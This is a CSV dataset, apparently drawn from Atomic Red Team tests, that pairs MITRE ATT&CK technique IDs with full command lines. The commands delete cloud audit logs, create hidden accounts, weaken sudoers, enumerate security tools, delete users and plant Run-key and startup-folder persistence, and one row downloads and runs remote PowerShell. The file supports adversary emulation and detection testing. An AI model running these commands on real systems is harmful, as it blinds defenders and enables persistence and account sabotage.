mitre_id,technique_name,command
T1562,Office 365 - Exchange Audit Log Disabled,"$secure_pwd = ""#{password}"" | convertto-securestring -asplaintext -force $creds = new-object system.management.automation.pscredential -argumentlist ""#{username}"", $secure_pwd connect-exchangeonline -credential $creds set-adminauditlogconfig -unifiedauditlogingestionenabled $false"
T1562,AWS - Disable CloudTrail Logging Through Event Selectors using Stratus,"export aws_region=#{aws_region} cd #{stratus_path} echo ""starting warmup"" ./stratus warmup aws.defense-evasion.cloudtrail-event-selectors echo ""starting detonate"" ./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force"
T1562,AWS - CloudTrail Logs Impairment Through S3 Lifecycle Rule using Stratus,"export aws_region=#{aws_region} cd #{stratus_path} echo ""starting warmup"" ./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule echo ""starting detonate"" ./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force"
T1562,AWS - Remove VPC Flow Logs using Stratus,"export aws_region=#{aws_region} cd #{stratus_path} echo ""starting warmup"" ./stratus warmup aws.defense-evasion.vpc-remove-flow-logs echo ""starting detonate"" ./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force"
T1562,AWS - CloudWatch Log Group Deletes,"aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json echo ""*** log group created ***"" aws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json echo ""*** log group deleted ***"""
T1562,AWS CloudWatch Log Stream Deletes,"aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json echo ""*** log group created ***"" aws logs create-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name} --region #{region} echo ""*** log stream created ***"" aws logs delete-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name} --region #{region} echo ""*** log stream deleted ***"" aws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json echo ""*** log group deleted ***"""
T1562,Office 365 - Set Audit Bypass For a Mailbox,"$secure_pwd = ""#{password}"" | convertto-securestring -asplaintext -force $creds = new-object system.management.automation.pscredential -argumentlist ""#{username}"", $secure_pwd connect-exchangeonline -credential $creds set-mailboxauditbypassassociation -identity ""#{target_email}"" -auditbypassenabled $true"
T1562,GCP - Delete Activity Event Log,gcloud config set project #{project-id} gcloud logging logs delete projects/#{project-id}/logs/cloudaudit.googleapis.com%2factivity --quiet
T1564,Create Hidden User using UniqueID < 500,sudo dscl . -create /users/#{user_name} uniqueid 333
T1564,Create Hidden User using IsHidden option,sudo dscl . -create /users/#{user_name} ishidden 1
T1564,Create Hidden User in Registry,"net user #{user_name}$ #{user_password} /add /expires:never reg add ""hklm\software\microsoft\windows nt\currentversion\winlogon\specialaccounts\userlist"" /v #{user_name}$ /t reg_dword /d 0"
T1548,Sudo usage,sudo -l sudo cat /etc/sudoers sudo vim /etc/sudoers
T1548,Sudo usage (freebsd),sudo -l sudo cat /usr/local/etc/sudoers sudo ee /usr/local/etc/sudoers
T1548,Unlimited sudo cache timeout,"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers sudo visudo -c -f /etc/sudoers"
T1548,Unlimited sudo cache timeout (freebsd),"sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers sudo visudo -c -f /usr/local/etc/sudoers"
T1548,Disable tty_tickets for sudo caching,"sudo sh -c ""echo defaults ""'!'""tty_tickets >> /etc/sudoers"" sudo visudo -c -f /etc/sudoers"
T1548,Disable tty_tickets for sudo caching (freebsd),"sudo sh -c ""echo defaults ""'!'""tty_tickets >> /usr/local/etc/sudoers"" sudo visudo -c -f /usr/local/etc/sudoers"
T1518,Security Software Discovery,"netsh.exe advfirewall show allprofiles netsh.exe advfirewall firewall dump netsh.exe advfirewall show currentprofile netsh.exe advfirewall firewall show rule name=all netsh.exe firewall show state netsh.exe firewall show config sc query windefend powershell.exe /c ""get-process | where-object { $_.processname -eq 'sysmon' }"" powershell.exe /c ""get-service | where-object {$_.displayname -like '*sysm*'}"" powershell.exe /c ""get-ciminstance win32_service -filter 'description = ''system monitor service'''"" tasklist.exe tasklist.exe | findstr /i virus tasklist.exe | findstr /i cb tasklist.exe | findstr /i defender tasklist.exe | findstr /i cylance tasklist.exe | findstr /i mc tasklist.exe | findstr /i ""virus cb defender cylance mc"""
T1518,Security Software Discovery - powershell,"get-process | ?{$_.description -like ""*virus*""} get-process | ?{$_.description -like ""*carbonblack*""} get-process | ?{$_.description -like ""*defender*""} get-process | ?{$_.description -like ""*cylance*""} get-process | ?{$_.description -like ""*mc*""} get-process | ?{$_.processname -like ""*mc*""} get-process | where-object { $_.processname -eq ""sysmon"" }"
T1518,Security Software Discovery - ps (macOS),ps aux | egrep 'little\ snitch|cbosxsensorservice|falcond|nessusd|santad|cbdefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|blockblock|lulu'
T1518,Security Software Discovery - ps (Linux),ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'
T1518,Security Software Discovery - pgrep (FreeBSD),pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd'
T1518,Security Software Discovery - Sysmon Service,fltmc.exe | findstr.exe 385201
T1518,Security Software Discovery - AV Discovery via WMI,wmic.exe /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list
T1518,Security Software Discovery - AV Discovery via Get-CimInstance and Get-WmiObject cmdlets,powershell get-ciminstance -namespace root/securitycenter2 -classname antivirusproduct powershell get-wmiobject -namespace root\securitycenter2 -class antivirusproduct
T1518,Security Software Discovery - Windows Defender Enumeration,"get-service windefend #check the service state of windows defender get-mpcomputerstatus #provides the current status of security solution elements, including anti-spyware, antivirus, loavprotection, real-time protection, etc get-mpthreat #threats details that have been detected using ms defender"
T1518,Security Software Discovery - Windows Firewall Enumeration,"get-netfirewallprofile | format-table name, enabled get-netfirewallsetting get-netfirewallrule | select displayname, enabled, description"
T1518,Get Windows Defender exclusion settings using WMIC,"wmic /node:localhost /namespace:\\root\microsoft\windows\defender path msft_mppreference get /format:list | findstr /i /c:""disablerealtimemonitoring"" /c:""exclusionpath"" /c:""exclusionextension"" /c:""exclusionprocess"""
T1531,Change User Password - Windows,net user #{user_account} #{new_user_password} /add net.exe user #{user_account} #{new_password}
T1531,Delete User - Windows,net user #{user_account} #{new_user_password} /add net.exe user #{user_account} /delete
T1531,Remove Account From Domain Admin Group,"$pword = convertto-securestring -string #{super_pass} -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist #{super_user}, $pword if((get-aduser #{remove_user} -properties memberof).memberof -like ""cn=domain admins*""){ remove-adgroupmember -identity ""domain admins"" -members #{remove_user} -credential $credential -confirm:$false } else{ write-host ""error - make sure #{remove_user} is in the domain admins group"" -foregroundcolor red }"
T1531,Change User Password via passwd,passwd #{user_account} #enter admin password > enter new password > confirm new password
T1531,Delete User via dscl utility,dscl . -delete /users/#{user_account} #enter admin password
T1531,Delete User via sysadminctl utility,sysadminctl -deleteuser #{user_account} #enter admin password
T1531,Azure AD - Delete user via Azure AD PowerShell,"connect-azuread $userprincipalname = ""#{userprincipalname}"" remove-azureaduser -objectid $userprincipalname"
T1531,Azure AD - Delete user via Azure CLI,"az login $userprincipalname = ""#{userprincipalname}"" az ad user delete --id $userprincipalname"
T1069,Permission Groups Discovery (Local),"if [ -x ""$(command -v dscacheutil)"" ]; then dscacheutil -q group; else echo ""dscacheutil is missing from the machine. skipping...""; fi; if [ -x ""$(command -v dscl)"" ]; then dscl . -list /groups; else echo ""dscl is missing from the machine. skipping...""; fi; if [ -x ""$(command -v groups)"" ]; then groups; else echo ""groups is missing from the machine. skipping...""; fi; if [ -x ""$(command -v id)"" ]; then id; else echo ""id is missing from the machine. skipping...""; fi; if [ -x ""$(command -v getent)"" ]; then getent group; else echo ""getent is missing from the machine. skipping...""; fi; cat /etc/group"
T1069,Basic Permission Groups Discovery Windows (Local),"net localgroup net localgroup ""administrators"""
T1069,Permission Groups Discovery PowerShell (Local),"get-localgroup get-localgroupmember -name ""administrators"""
T1069,SharpHound3 - LocalAdmin,"new-item -path ""#{output_path}"" -itemtype directory > $null & ""#{sharphound_path}"" -d ""#{domain}"" --collectionmethod localadmin --nosavecache --outputdirectory ""#{output_path}"""
T1069,Wmic Group Discovery,wmic group get name
T1069,WMIObject Group Discovery,get-wmiobject win32_group
T1069,Permission Groups Discovery for Containers- Local Groups,docker build -t t1069 $pathtoatomicsfolder/t1069.001/src/ docker run --name t1069_container --rm -d -t t1069 docker exec t1069_container ./test.sh
T1547,Reg Key Run,"reg add ""hkcu\software\microsoft\windows\currentversion\run"" /v ""atomic red team"" /t reg_sz /f /d ""#{command_to_execute}"""
T1547,Reg Key RunOnce,"reg add hklm\software\microsoft\windows\currentversion\runonceex\0001\depend /v 1 /d ""#{thing_to_execute}"""
T1547,PowerShell Registry RunOnce,"$runoncekey = ""#{reg_key_path}"" set-itemproperty $runoncekey ""nextrun"" '#{thing_to_execute} ""iex (new-object net.webclient).downloadstring(`""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/t1547.001/src/discovery.bat`"")""'"
T1547,Suspicious vbs file run from startup Folder,"copy-item ""$pathtoatomicsfolder\t1547.001\src\vbsstartup.vbs"" ""$env:appdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"" copy-item ""$pathtoatomicsfolder\t1547.001\src\vbsstartup.vbs"" ""c:\programdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"" cscript.exe ""$env:appdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"" cscript.exe ""c:\programdata\microsoft\windows\start menu\programs\startup\vbsstartup.vbs"""
T1547,Suspicious jse file run from startup Folder,"copy-item ""$pathtoatomicsfolder\t1547.001\src\jsestartup.jse"" ""$env:appdata\microsoft\windows\start menu\programs\startup\jsestartup.jse"" copy-item ""$pathtoatomicsfolder\t1547.001\src\jsestartup.jse"" ""c:\programdata\microsoft\windows\start menu\programs\startup\jsestartup.jse"" cscript.exe /e:jscript ""$env:appdata\microsoft\windows\start menu\programs\startup\jsestartup.jse"" cscript.exe /e:jscript ""c:\programdata\microsoft\windows\start menu\programs\startup\jsestartup.jse"""
T1547,Suspicious bat file run from startup Folder,"copy-item ""$pathtoatomicsfolder\t1547.001\src\batstartup.bat"" ""$env:appdata\microsoft\windows\start menu\programs\startup\batstartup.bat"" copy-item ""$pathtoatomicsfolder\t1547.001\src\batstartup.bat"" ""c:\programdata\microsoft\windows\start menu\programs\startup\batstartup.bat"" start-process ""$env:appdata\microsoft\windows\start menu\programs\startup\batstartup.bat"" start-process ""c:\programdata\microsoft\windows\start menu\programs\startup\batstartup.bat"""
T1547,Add Executable Shortcut Link to User Startup Folder,"$target = ""c:\windows\system32\calc.exe"" $shortcutlocation = ""$home\appdata\roaming\microsoft\windows\start menu\programs\startup\calc_exe.lnk"" $wscriptshell = new-object -comobject wscript.shell $create = $wscriptshell.createshortcut($shortcutlocation) $create.targetpath = $target $create.save()"
T1547,Add persistance via Recycle bin,"reg add ""hkcr\clsid\{645ff040-5081-101b-9f08-00aa002f954e}\shell\open\command"" /ve /d ""calc.exe"" /f"
T1547,SystemBC Malware-as-a-Service Registry,"$runkey = ""#{reg_key_path}"" set-itemproperty -path $runkey -name ""socks5_powershell"" -value ""#{reg_key_value}"""
T1547,Change Startup Folder - HKLM Modify User Shell Folders Common Startup Value,"new-item -itemtype directory -path ""#{new_startup_folder}"" copy-item -path ""#{payload}"" -destination ""#{new_startup_folder}"" set-itemproperty -path ""hklm:\software\microsoft\windows\currentversion\explorer\user shell folders"" -name ""common startup"" -value ""#{new_startup_folder}"""
T1547,Change Startup Folder - HKCU Modify User Shell Folders Startup Value,"new-item -itemtype directory -path ""#{new_startup_folder}"" copy-item -path ""#{payload}"" -destination ""#{new_startup_folder}"" set-itemproperty -path ""hkcu:\software\microsoft\windows\currentversion\explorer\user shell folders"" -name ""startup"" -value ""#{new_startup_folder}"""
T1547,HKCU - Policy Settings Explorer Run Key,"if (!(test-path -path ""hkcu:\software\microsoft\windows\currentversion\policies\explorer"")){ new-item -itemtype key -path ""hkcu:\software\microsoft\windows\currentversion\policies\explorer"" } if (!(test-path -path ""hkcu:\software\microsoft\windows\currentversion\policies\explorer\run"")){ new-item -itemtype key -path ""hkcu:\software\microsoft\windows\currentversion\policies\explorer\run"" } set-itemproperty -path ""hkcu:\software\microsoft\windows\currentversion\policies\explorer\run"" -name ""#{target_key_value_name}"" -value ""#{payload}"""
T1547,HKLM - Policy Settings Explorer Run Key,"if (!(test-path -path ""hklm:\software\microsoft\windows\currentversion\policies\explorer\run"")){ new-item -itemtype key -path ""hklm:\software\microsoft\windows\currentversion\policies\explorer\run"" } set-itemproperty -path ""hklm:\software\microsoft\windows\currentversion\policies\explorer\run"" -name ""#{target_key_value_name}"" -value ""#{payload}"""
T1547,HKLM - Append Command to Winlogon Userinit KEY Value,"$oldvalue = $(get-itempropertyvalue -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""userinit""); set-itemproperty -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""userinit-backup"" -value ""$oldvalue""; $newvalue = $oldvalue + "" #{payload}""; set-itemproperty -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""userinit"" -value ""$newvalue"""
T1547,HKLM - Modify default System Shell - Winlogon Shell KEY Value ,"$oldvalue = $(get-itempropertyvalue -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""shell""); set-itemproperty -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""shell-backup"" -value ""$oldvalue""; $newvalue = $oldvalue + "", #{payload}""; set-itemproperty -path ""hklm:\software\microsoft\windows nt\currentversion\winlogon"" -name ""shell"" -value ""$newvalue"""
T1547,secedit used to create a Run key in the HKLM Hive,"secedit /import /db #{secedit_db} /cfg ""#{ini_file}"" secedit /configure /db #{secedit_db}"
T1547,Modify BootExecute Value,"if (!(test-path ""$pathtoatomicsfolder\t1547.001\src\sessionmanagerbackup.reg"")) { reg.exe export ""hklm\system\currentcontrolset\control\session manager"" ""$pathtoatomicsfolder\t1547.001\src\sessionmanagerbackup.reg"" /y } set-itemproperty -path ""hklm:\system\currentcontrolset\control\session manager"" -name ""bootexecute"" -value ""#{registry_value}"" -type multistring"
T1547,Allowing custom application to execute during new RDP logon session,"reg add ""hklm\system\currentcontrolset\control\terminal server\wds\rdpwd"" /f /v startupprograms /t reg_sz /d ""#{malicious_app}"""
